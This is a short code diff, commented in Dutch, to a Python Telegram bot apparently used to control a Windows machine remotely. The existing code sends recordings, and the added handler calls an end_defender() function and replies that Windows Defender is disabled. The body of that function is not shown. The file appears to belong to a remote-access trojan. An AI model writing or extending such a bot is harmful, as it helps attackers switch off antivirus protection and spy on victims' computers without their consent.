@@ -32,6 +32,13 @@ async def record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         supports_streaming=True
     )
 
+# Windows defender uitzetten
+async def record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # meld dat Windows defender uit is
+    await context.bot.send_message(chat_id=update.effective_chat.id, text="Windows Defender is uitgeschakeld")
+    end_defender()
+
+
 # Log errors
 async def log_error(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print(f'Update {update} caused error {context.error}')
